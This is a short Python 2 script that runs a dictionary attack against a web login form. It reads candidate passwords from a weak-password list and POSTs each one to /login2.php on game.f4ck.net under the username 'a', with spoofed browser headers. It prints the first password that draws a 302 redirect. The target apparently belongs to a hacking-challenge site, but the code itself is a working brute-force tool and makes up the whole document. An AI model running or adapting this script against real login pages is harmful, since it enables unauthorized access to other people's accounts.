__author__="ouyang"
__date__ ="$2013-1-15 14:39:34$"

import httplib
import urllib

if __name__ == "__main__":
	headers = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			   'Accept-Encoding':'gzip, deflate',
               'Accept-Language':'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
			   'Cache-Control':'max-age=0',
               'Connection':'keep-alive',
               'Host':'game.f4ck.net',
               'Referer':'http://game.f4ck.net/jfasdsdlml.html',
               'User-Agent':'Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0',
               'Content-Type': 'application/x-www-form-urlencoded'
              }
	url = 'game.f4ck.net'
	path = '/login2.php'
	passfile = "weakpass.txt"
	inStream = file(passfile,"r")
	for tmpLine in inStream:
		params = urllib.urlencode({'log':'a','password':tmpLine.strip('\n')})
		conn = httplib.HTTPConnection(url)
		conn.request('POST',path,params,headers)
		response = conn.getresponse()
		if response.status == 302:
			print tmpLine
			break
		conn.close()
	inStream.close()
